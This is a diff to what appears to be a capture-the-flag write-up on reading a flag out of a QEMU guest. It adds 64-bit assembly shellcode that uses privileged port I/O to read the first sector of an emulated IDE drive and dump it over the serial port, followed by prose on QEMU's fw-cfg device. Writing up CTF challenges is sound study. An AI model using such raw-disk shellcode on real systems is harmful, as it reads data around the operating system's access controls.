@@ -66,6 +66,73 @@ We tried to interact with the emulated **PCI** device to read directly the flag 
 
 After wasting our time with the first path, we gave a second look at the list of emulated devices and this particular device caught **@prosti**'s attention...
 
+### ATA PIO shellcode
+If the flag is imported into **QEMU** with `-drive format=raw,if=ide` (**QEMU** will use **IDE** as the default interface if not specified) the device emulates an hard drive, which we can read with the following shellcode:
+
+```
+; 64-bit iopl3, ATA PIO read, index -> rdi
+bits 64
+  mov ecx, 0x100    
+.loop:
+  push 0
+  sub ecx, 8
+  cmp ecx, 0
+  jne .loop
+
+.index:
+  mov r8, 0xe0      ; master/slave
+  mov r9, 0x1f0      ; primary/secondary
+
+  mov r15, 0xf0      
+  test rdi, 1        ; is slave?
+  cmovne r8, r15
+  
+  mov r15, 0x170
+  test rdi, 2        ; is secondary?
+  cmovne r9, r15
+
+.main:
+  lea rdx, [r9 + 6]
+  mov rax, r8        ; LBA mode + master/slave
+  out dx, al
+
+  lea rdx, [r9 + 2]
+  mov al, 1         ; sector count
+  out dx, al
+
+  inc dx          ; 3
+  xor al, al         ; LBA low = 0
+  out dx, al
+  inc dx           ; 4
+  out dx, al         ; LBA mid = 0
+  inc dx            ; 5
+  out dx, al          ; LBA high = 0
+
+  lea rdx, [r9 + 7]
+  mov al, 0x20      ; READ SECTORS (PIO)
+  out dx, al
+
+.wait:
+  in al, dx
+  test al, 0x80        ; BSY
+  jnz .wait
+  test al, 0x08        ; DRQ
+  jz .wait
+
+  mov rdx, r9
+  mov rdi, rsp
+  mov ecx, 128       ; 128 words = 256 bytes
+  rep insw
+
+  mov dx, 0x3f8
+  mov rsi, rsp
+  mov ecx, 256
+  rep outsb
+
+.die:
+  jmp .die
+```
+
 ### QEMU's fw-cfg emulated device
 ![fw-cfg device from QEMU monitor](/images/fw_cfg/fw_cfg_monitor.png)
 Do you see it? **dma_enabled = true** kind of sticks out and for this reason I decided to get more information about the device. The best documentation that I found is from [OSDev](https://wiki.osdev.org/QEMU_fw_cfg) and [QEMU's official docs](https://www.qemu.org/docs/master/specs/fw_cfg.html) site. If you have time I'd recommend to read one of the two docs (it's a pretty short read).
